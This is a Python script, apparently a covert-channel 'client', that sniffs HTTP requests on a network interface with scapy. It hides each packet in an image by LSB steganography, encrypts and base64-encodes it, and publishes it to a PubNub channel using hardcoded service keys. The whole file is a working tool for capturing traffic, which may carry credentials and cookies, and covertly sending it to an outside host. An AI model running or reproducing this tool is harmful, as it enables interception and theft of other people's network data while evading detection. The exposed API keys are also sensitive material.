import base64
from pubnub.callbacks import SubscribeCallback
from pubnub.pnconfiguration import PNConfiguration
from pubnub.pubnub import PubNub
from Crypto.Cipher import AES
import os
from colorama import init, Fore, Back, Style
import scapy.all as scapy
#for http packets
from scapy.layers import http
import LSBsteg as lsb

# ******************** configuring communication channel ********************
pnconfig = PNConfiguration()

pnconfig.publish_key = 'pub-c-50be4c1f-64fc-44c1-949a-a156ae6e83d8'
pnconfig.subscribe_key = 'sub-c-0fcf10c8-8ade-11ec-9f2b-a2cedba671e8'
pnconfig.uuid = 'myUniqueUUID'
pnconfig.ssl = True

pubnub = PubNub(pnconfig)

# ************************* importing secret key *********************
f=open("AesSecretKey.privkey", "rb")
secretKey=f.read()
f.close()

# ******************** encrypt/decrypt *************************
def encrypt_AES_GCM(msg, secretKey):
    aesCipher = AES.new(secretKey, AES.MODE_GCM)
    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
    f=open("authtag.txt",'wb')
    f.write(authTag)
    f.close()
    return (ciphertext, aesCipher.nonce, authTag)

def decrypt_AES_GCM(encryptedMsg, secretKey):
    (ciphertext, nonce, authTag) = encryptedMsg
    f = open("authtag.txt", 'rb')
    authTag=f.read()
    f.close()
    aesCipher = AES.new(secretKey, AES.MODE_GCM, nonce)
    plaintext = aesCipher.decrypt_and_verify(ciphertext, authTag)
    return plaintext
# encryptedMsg = encrypt_AES_GCM(msg, secretKey)
# decryptedMsg = decrypt_AES_GCM(encryptedMsg, secretKey)


# ******************** information ********************
init(autoreset=True)
print(Style.BRIGHT + Back.WHITE + Fore.BLACK +"-- CLIENT --")
print(Style.BRIGHT + Back.BLACK + Fore.RED +"-- Client Logs -- ")

# *************************************** Connecting client server **********************************************************
## Sending Request
def my_publish_callback(envelope, status):
    # Check whether request successfully completed or not
    if not status.is_error():
        pass

## Receiving response
class MySubscribeCallback(SubscribeCallback):
    def presence(self, pubnub, presence):
        pass
    def status(self, pubnub, status):
        pass
    def message(self, pubnub, mesage):
        print (Style.BRIGHT + Back.BLACK + Fore.YELLOW +"\n[+] Response from server: " +Style.BRIGHT + Back.BLACK + Fore.GREEN + mesage.message)

pubnub.add_listener(MySubscribeCallback())
pubnub.subscribe().channels("chan-1").execute()

# Sender
def sender():
    scapy.sniff(iface="eth0", store=False, prn=write)

def write(pkt):
    if pkt.haslayer(http.HTTPRequest):
        ## publish a request and get response
        imgbytes = (lsb.encode_convert_img2byte(bytes(pkt))) # encoding packet into image
        encryptedMsg = encrypt_AES_GCM(imgbytes, secretKey) # encrypting image pixels
        bytetogether = b''.join(encryptedMsg)
        strng = base64.b64encode(bytetogether)  # changing to base-64
        msg = str(strng)
        print(Style.BRIGHT + Back.YELLOW + Fore.RED +"\n[-] Sending request -- "+Style.BRIGHT + Back.BLACK + Fore.WHITE+msg)
        pubnub.publish().channel("chan-1").message(msg).pn_async(my_publish_callback)

sender()
